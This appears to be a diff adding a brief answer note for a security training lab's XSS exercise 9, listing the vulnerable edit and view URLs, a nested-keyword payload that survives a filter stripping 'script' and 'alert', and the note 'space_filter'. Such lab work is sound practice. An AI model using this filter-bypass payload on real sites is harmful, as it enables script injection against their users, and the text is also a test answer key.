@@ -1,0 +1,15 @@
+============================
+
+* XSS 문제 9번 
+
+============================
+
+1. https://lab.eqst.co.kr:8083/exam23/process/faqboardEditProcess.php?content
+
+2. https://lab.eqst.co.kr:8083/exam23/faqview.php?board_id=36379
+
+3. <scscriptript>alealertrt('xss');</scscriptript>
+
+4. space_filter
+
+============================
